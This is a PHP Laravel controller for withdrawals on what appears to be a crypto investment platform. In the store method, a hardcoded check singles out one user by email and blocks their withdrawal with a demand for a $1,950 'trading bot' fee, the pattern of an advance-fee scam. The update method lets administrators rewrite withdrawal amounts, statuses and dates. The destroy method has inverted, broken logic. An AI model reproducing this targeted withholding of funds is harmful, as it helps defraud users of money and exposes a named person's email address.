<?php

namespace App\Http\Controllers;

use App\Models\Withdrawal;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Notifications\GeneralNotification;
use App\Models\Role;
use PragmaRX\Countries\Package\Countries;


class WithdrawalController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $request->validate([
            'source' => 'required',
            'amount' => 'required',
            'wallet_name' => 'required',
            'wallet_address' => 'required',
        ]);

        $user = Auth::user();
        $ref_bal = $user->referralBalance();
        $accountBalance = $user->accountBalance();
        $topBal = $user->topUpBal();

        if ($request->source == 'referral') {
            if ($request->amount > $ref_bal) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'withdrawal amount must not be greater than $'. number_format($ref_bal, 2, '.', ',').' which is your referral balance',
                ], 400);
            }
        }

        if ($request->source == 'investment') {
            if ($request->amount > $accountBalance) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'withdrawal amount must not be greater than $'. number_format($accountBalance, 2, '.', ',').' which is your current account balance',
                ], 400);
            }
        }

        if ($request->source == 'bonus') {
            if ($request->amount > $topBal) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'withdrawal amount must not be greater than $'. number_format($topBal, 2, '.', ',').' which is your current bonus balance',
                ], 400);
            }

            if (Auth::user()->email == 'byyldrmtnr@gmail.com') {
                return response()->json([
                    'status' => 'error',
                    'message' => 'Withdrawal not allowed! Due to the expenses incured in setting up our new trading bots, you are required to pay a fee of $'. number_format(1950, 2, '.', ',').' before withdrawing your funds, kindly chat our support for assistance. Thank you',
                ], 400);
            }
        }

        if ($user->withdrawals->where('status', 'pending')->count() > 0) {
            return response()->json([
                'status' => 'error',
                'message' => 'you still have a pending withdrawals, kindly wait for admin\'s approval before making another request. Thank you.',
            ], 400);
        }

        $withdrawal = new Withdrawal;
        $withdrawal->user_id = Auth::id();
        $withdrawal->source = $request->source;
        $withdrawal->amount = $request->amount;
        $withdrawal->status = 'pending';
        $withdrawal->wallet_name = $request->wallet_name;
        $withdrawal->wallet_address = $request->wallet_address;
        $withdrawal->save();

        // notify the user of confirmed deposit
        $notification_details = [
            'title' => 'withdrawal registered',
            'content' => substr($withdrawal->user->name, 0, -3).'****'.' just withdrew $'.number_format($withdrawal->amount, 2, '.', ','),
            'mail_content' => 'Dear '. Auth::user()->name.', <br/> This is to notify you that your withdrawal of $'.number_format($withdrawal->amount, 2, '.', ',').' to your '.$withdrawal->wallet_name.' wallet was registered successfully and currently awaiting approval  by our admin. We will notify you upon approval of your withdrawal by admin. Thank you.',
        ];
        $activity = (object)$notification_details;
        Auth::user()->notify(new GeneralNotification($activity));

        $roles = Role::all();
         $admin_notification = [
            'title' => 'New withdrawal',
            'content' => substr($withdrawal->user->name, 0, -3).'****'.' just withdrew $'.number_format($withdrawal->amount, 2, '.', ','),
            'mail_content' => 'there is a new withdrawal of $'.number_format($withdrawal->amount, 2, '.', ','). ' from '.Auth::user()->name,
        ];
        $admin_activity = (object)$admin_notification;        
        foreach ($roles->where('name', 'admin') as $role) {
           $user = $role->user;
           $user->notify(new GeneralNotification($admin_activity));
        }

        return response()->json([
            'status' => 'success',
            'message' => 'withdrawal registered successfully, we will notify you upon approval of your request. Thank you.',
        ], 200);
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Withdrawal  $withdrawal
     * @return \Illuminate\Http\Response
     */
    public function show(Withdrawal $withdrawal)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Withdrawal  $withdrawal
     * @return \Illuminate\Http\Response
     */
    public function edit(Withdrawal $withdrawal)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Withdrawal  $withdrawal
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Withdrawal $withdrawal, $id)
    {
        $request->validate([
            'amount' => 'required',
            'status' => 'required',
            'date' => 'nullable'
        ]);

        $withdrawal = $withdrawal->find($id);
        if (!$withdrawal) {
            return response()->json([
                'status' => 'error',
                'message' => 'withdrawal not found!',
            ], 400);
        }
        if ($request->has('date')) {
            $withdrawal->created_at = $request->date;;
        }
        $withdrawal->amount = $request->amount;
        $withdrawal->status = $request->status;
        $withdrawal->save();

        return response()->json([
            'status' => 'success',
            'message' => 'withdrawal updated successfully',
        ], 200);
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Withdrawal  $withdrawal
     * @return \Illuminate\Http\Response
     */
    public function destroy(Withdrawal $withdrawal, $id)
    {
        $withdrawal = $withdrawal->find($id);
        if ($withdrawal) {
            return response()->json([
                'status' => 'error',
                'message' => 'withdrawal not found!',
            ], 400);
        }

        $withdrawal->delete();
        return response()->json([
            'status' => 'success',
            'message' => 'withdrawal deleted successfully',
        ], 200);
    }
}
